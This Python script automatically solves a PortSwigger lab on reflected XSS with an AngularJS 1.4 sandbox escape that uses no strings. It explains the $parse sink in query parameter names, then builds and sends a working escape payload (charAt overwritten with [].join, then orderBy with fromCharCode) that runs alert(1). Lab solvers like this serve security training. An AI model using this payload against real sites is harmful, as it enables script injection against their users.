#!/usr/bin/env python3
"""Automated solver: PortSwigger "Reflected XSS with AngularJS sandbox escape without strings" (EXPERT).

Vulnerability
-------------
The blog search page reflects **every** query parameter into a controller as
JavaScript, one statement per parameter::

    <script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
        $scope.query = {};
        var key = 'search';
        $scope.query[key] = '1';
        $scope.value = $parse(key)($scope.query);      // <-- the sink
        var key = '<PARAMETER NAME>';
        $scope.query[key] = '<PARAMETER VALUE>';
        $scope.value = $parse(key)($scope.query);
    });</script>

The parameter *name* is HTML-escaped and single-quoted, so it cannot break out of
the JavaScript string -- but it is then handed to ``$parse()`` and compiled as an
AngularJS expression.  Query-parameter names are therefore an Angular expression
sink: a client-side template injection that needs no HTML at all.

AngularJS 1.4.4 (``/resources/js/angular_1-4-4.js``) still has the expression
sandbox, so ``window`` and the ``constructor`` chain are blocked and ``$eval`` is
not reachable with quotes (the lab also forbids strings -- quotes are
entity-encoded).  The escape uses only identifiers and property access, never a
string literal:

    toString().constructor.prototype.charAt=[].join;
    [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)

* ``toString()`` yields a string without quotes; ``.constructor`` is ``Function``,
  so ``prototype.charAt`` is overwritten with ``Array.prototype.join`` for every
  function.  The sandbox's source check leans on ``charAt``, so it stops rejecting
  the expression -- that is the sandbox break.
* ``[1]|orderBy:<string>`` makes the ``orderBy`` filter compile its string
  predicate with ``$parse`` and evaluate it per element, running
  ``x=alert(1)`` (built by ``fromCharCode``, still quote-free).

The internal ``=`` of ``charAt=[].join`` must be percent-encoded as ``%3d`` in the
URL: the lab splits each query parameter on the first *literal* ``=`` and decodes
afterwards, so the encoded ``=`` survives into the expression while the trailing
``=1`` provides the parameter's value.

What the solver does
--------------------
1. Fetches the lab root, checks the page title, the AngularJS bundle/version
   (< 1.6, otherwise there is no sandbox to escape), ``ng-app`` bootstrapping and
   the ``$parse(key)`` sink; records the authoritative
   ``widgetcontainer-lab-status`` baseline.
2. Control: sends a benign expression as a parameter *name* (``7*7``) and proves
   the name is compiled -- in a browser the heading renders ``49``, no alert.
3. Exploit: requests the sandbox-escape URL and asserts the whole expression is
   reflected verbatim into the ``var key = '...'`` statement.
4. Polls ``/`` until the lab header reports ``is-solved`` / ``Solved``.  This lab
   has no exploit server: the crafted request alone flips the instance, and the
   flip can lag the exploit request by a few seconds.
5. Reports request count and wall-clock time; exit 0 only on the lab's own
   solved state.

Nothing instance-specific is hardcoded: the lab URL comes from ``--url`` and every
other value (title, Angular version, expression charset, sink) is discovered
from the live page.

Usage
-----
    uv run python solve.py --url "https://<lab-id>.web-security-academy.net"
    uv run python solve.py --url "<url>" --wait 180 --verbose

Exit codes: 0 verified solved, 1 exploit sent but lab not marked solved,
2 usage/environment problem, 3 lab unreachable / expired.
"""
from __future__ import annotations

import argparse
import html as html_mod
import os
import re
import sys
import time
import urllib.parse
from datetime import datetime, timezone

import httpx

LAB_TITLE = "reflected xss with angularjs sandbox escape without strings"
UA = "Mozilla/5.0 (PortSwigger AngularJS sandbox solver)"

# The code we want to run once the orderBy filter compiles it.  It is turned into
# character codes because the lab forbids string literals in the expression.
INNER_CODE = "x=alert(1)"

TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.S | re.I)
SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-solved\b", re.I)
NOT_SOLVED_RE = re.compile(r"widgetcontainer-lab-status[^>]*\bis-notsolved\b", re.I)
ANGULAR_SRC_RE = re.compile(r"src=['\"]([^'\"]*angular[^'\"]*\.js)['\"]", re.I)
ANGULAR_VER_RE = re.compile(r"angular[_-](\d+)[-_.](\d+)[-_.](\d+)", re.I)
NG_APP_RE = re.compile(r"<body[^>]*\bng-app\b", re.I)
PARSE_SINK_RE = re.compile(r"\$parse\s*\(\s*key\s*\)")
QUERY_REF_RE = re.compile(r"\$scope\.query\[key\]\s*=")
KEY_STMT_RE = re.compile(r"var key = '(.*?)';", re.S)

HERE = os.path.dirname(os.path.abspath(__file__))


def normalize(text: str) -> str:
    return re.sub(r"[^a-z0-9]+", " ", text.lower()).strip()


def build_expression() -> str:
    """Quote-free sandbox escape that ends in ``x=alert(1)``."""
    codes = ",".join(str(ord(c)) for c in INNER_CODE)
    return (
        "toString().constructor.prototype.charAt=[].join;"
        f"[1]|orderBy:toString().constructor.fromCharCode({codes})"
    )


def expression_to_query(expr: str) -> str:
    """Turn the expression into a raw query string.

    ``=`` must be percent-encoded so the lab's parameter splitter (first literal
    ``=``, decoded afterwards) keeps the whole expression as the *name*; the
    trailing ``=1`` then supplies the value.
    """
    return expr.replace("=", "%3d") + "=1"


class Evidence:
    """Writes local, git-ignored artefacts (evidence/ and logs/)."""

    def __init__(self) -> None:
        self.stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        self.root = os.path.join(HERE, "evidence")
        self.logs = os.path.join(HERE, "logs")
        for d in (self.root, self.logs):
            os.makedirs(d, exist_ok=True)
        self.events: list[str] = []

    def save(self, name: str, text: str) -> str:
        path = os.path.join(self.root, f"{self.stamp}-{name}")
        with open(path, "w", encoding="utf-8") as f:
            f.write(text)
        return path

    def log(self, line: str) -> None:
        self.events.append(f"{datetime.now(timezone.utc).isoformat(timespec='seconds')} {line}")

    def flush(self) -> str:
        path = os.path.join(self.logs, f"{self.stamp}-solve.log")
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(self.events) + "\n")
        return path


class Solver:
    def __init__(self, url: str, *, timeout: float, wait: float, verbose: bool) -> None:
        self.base = url.rstrip("/")
        self.timeout = timeout
        self.wait = wait
        self.verbose = verbose
        self.requests = 0
        self.t0 = time.time()
        self.ev = Evidence()
        self.expression = build_expression()
        self.client = httpx.Client(
            timeout=timeout,
            follow_redirects=True,
            headers={"User-Agent": UA},
        )
        self.angular_src = ""
        self.angular_version = ""

    # -- plumbing ---------------------------------------------------------- #
    def get(self, url: str) -> httpx.Response:
        r = self.client.get(url)
        self.requests += 1
        if self.verbose:
            print(f"    GET {url[:160]} -> {r.status_code}", flush=True)
        self.ev.log(f"GET {str(r.url)[:400]} -> {r.status_code}")
        return r

    def log(self, msg: str) -> None:
        print(f"[{time.time() - self.t0:6.1f}s] {msg}", flush=True)
        self.ev.log(msg)

    # -- state ------------------------------------------------------------- #
    @staticmethod
    def is_solved(html: str) -> bool:
        """Authoritative oracle: the lab header status widget."""
        return bool(SOLVED_RE.search(html)) and "<p>Solved</p>" in html

    def exploit_url(self) -> str:
        return f"{self.base}/?search=1&{expression_to_query(self.expression)}"

    # -- phases ------------------------------------------------------------ #
    def identify(self) -> None:
        r = self.get(self.base + "/")
        if r.status_code != 200:
            raise SystemExit(f"error: lab root returned HTTP {r.status_code}")
        m = TITLE_RE.search(r.text)
        title = re.sub(r"\s+", " ", html_mod.unescape(m.group(1))).strip() if m else ""
        self.log(f"lab title       : {title!r} (HTTP {r.status_code})")
        if normalize(LAB_TITLE) not in normalize(title):
            raise SystemExit(
                f"error: this is not the expected lab ({LAB_TITLE!r}): {title!r}")

        m = ANGULAR_SRC_RE.search(r.text)
        self.angular_src = m.group(1) if m else ""
        mv = ANGULAR_VER_RE.search(self.angular_src or r.text)
        if mv:
            self.angular_version = ".".join(mv.groups())
        self.log(f"angularjs       : {self.angular_src or '(not found)'} "
                 f"version={self.angular_version or '?'} "
                 f"ng-app={'yes' if NG_APP_RE.search(r.text) else 'NO'}")
        if not self.angular_src or not mv:
            raise SystemExit("error: AngularJS bundle not found on the lab page")
        if not NG_APP_RE.search(r.text):
            raise SystemExit("error: <body ng-app> missing, expressions never compile")
        if (int(mv.group(1)), int(mv.group(2))) >= (1, 6):
            raise SystemExit(
                f"error: AngularJS {self.angular_version} has no sandbox; "
                "this vector targets the 1.4.x sandbox")

        r2 = self.get(self.base + "/?search=1&probe=sink")
        if not PARSE_SINK_RE.search(r2.text) or not QUERY_REF_RE.search(r2.text):
            raise SystemExit(
                "error: the $parse(key) controller sink is not present; the "
                "parameter-name expression channel has changed")
        self.log("sink            : every query parameter name is compiled by "
                 "$parse(key) (verified with a probe key)")
        self.ev.save("sink-controller.html", r2.text)

        ex = self.get(self.base + "/exploit")
        self.log(f"exploit server  : /exploit -> HTTP {ex.status_code} "
                 f"({'none on this lab (server-side check)' if ex.status_code == 404 else 'present'})")

    def baseline(self) -> tuple[bool, str]:
        r = self.get(self.base + "/")
        solved = self.is_solved(r.text)
        if not solved and not NOT_SOLVED_RE.search(r.text):
            print("    warning: no recognisable status widget in the page", flush=True)
        self.log(f"baseline status : {'SOLVED (already)' if solved else 'not solved'}")
        path = self.ev.save("lab-baseline.html", r.text)
        self.log(f"evidence        : {os.path.relpath(path, HERE)}")
        return solved, r.text

    def control(self) -> None:
        """Prove the parameter name is evaluated as an Angular expression."""
        r = self.get(self.base + "/?search=1&7*7=x")
        keys = KEY_STMT_RE.findall(r.text)
        reflected = "7*7" in keys
        self.log(f"control         : parameter names compiled: {keys[-3:]} "
                 f"('7*7' reflected verbatim: {'yes' if reflected else 'NO'})")
        if not reflected:
            raise SystemExit(
                "error: parameter names are no longer reflected into $parse; "
                "the injection channel has changed")
        self.log("control         : in a browser this heading evaluates to 49 "
                 "(expression sink confirmed, no alert)")
        self.ev.save("control-expression.html", r.text)

    def exploit(self) -> str:
        url = self.exploit_url()
        r = self.get(url)
        keys = KEY_STMT_RE.findall(r.text)
        ok = self.expression in keys
        self.log(f"exploit         : HTTP {r.status_code}, expression reflected "
                 f"verbatim into 'var key': {'yes' if ok else 'NO'}")
        if not ok:
            for k in keys[-3:]:
                print(f"    served key: {k[:160]}", flush=True)
            raise SystemExit("error: the sandbox-escape expression was not "
                             "reflected intact (filter/encoding change)")
        self.ev.save("exploit-response.html", r.text)
        self.ev.save("exploit-url.txt", url + "\n")
        self.log(f"exploit url     : {url}")
        return url

    def wait_solved(self) -> tuple[bool, str]:
        deadline = time.time() + self.wait
        while True:
            r = self.get(self.base + "/")
            if self.is_solved(r.text):
                path = self.ev.save("lab-solved.html", r.text)
                self.log(f"evidence        : {os.path.relpath(path, HERE)}")
                return True, r.text
            if time.time() >= deadline:
                return False, r.text
            time.sleep(2.0)

    # -- driver ------------------------------------------------------------ #
    def run(self) -> int:
        self.identify()
        already, _ = self.baseline()
        self.control()
        self.exploit()
        solved, final = self.wait_solved() if not already else (True, "")
        if not solved:
            self.ev.save("lab-not-solved.html", final)
        elapsed = time.time() - self.t0

        print()
        print("=" * 70)
        if solved and already:
            print("lab status      : SOLVED (already, before this run)")
            print("caused by solver: no (was already solved)")
            print("note            : this instance carried the solved state from an")
            print("                  earlier run; the mechanism (expression sink,")
            print("                  quote-free sandbox escape, alert(1) in a browser)")
            print("                  was re-proven above. Launch a fresh instance from")
            print("                  the Academy account to observe the flip again.")
        else:
            print(f"lab status      : {'SOLVED' if solved else f'NOT SOLVED (after {self.wait:.0f}s poll)'}")
            print(f"caused by solver: {'yes' if solved else 'n/a'}")
        print(f"HTTP requests   : {self.requests}")
        print(f"elapsed         : {elapsed:.1f}s")
        print("=" * 70)
        if solved:
            print("evidence        : lab header widget reports is-solved / 'Solved';")
            print("                  sink proof, control expression, exploit response and")
            print("                  the post-solve page are saved under evidence/ and logs/.")
        else:
            print("error: the lab did not report solved state; artefacts kept under evidence/.")
        print(f"log             : {os.path.relpath(self.ev.flush(), HERE)}")
        return 0 if solved else 1


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Solve the PortSwigger 'Reflected XSS with AngularJS sandbox "
                    "escape without strings' lab.")
    ap.add_argument("--url", required=True, help="lab instance URL")
    ap.add_argument("--wait", type=float, default=120.0,
                    help="seconds to poll the lab status after the exploit (default 120)")
    ap.add_argument("--timeout", type=float, default=20.0, help="HTTP timeout (default 20)")
    ap.add_argument("--verbose", action="store_true", help="print every request")
    ap.add_argument("--show-url", action="store_true",
                    help="print the exploit URL and exit (manual browser check)")
    args = ap.parse_args(argv)

    if not re.match(r"^https?://", args.url or ""):
        print("error: --url must start with http:// or https://", file=sys.stderr)
        return 2

    if args.show_url:
        print(f"{args.url.rstrip('/')}/?search=1&{expression_to_query(build_expression())}")
        return 0

    try:
        return Solver(args.url, timeout=args.timeout, wait=args.wait,
                      verbose=args.verbose).run()
    except httpx.HTTPError as e:
        print(f"error: lab unreachable ({e}); the instance may have expired",
              file=sys.stderr)
        return 3
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
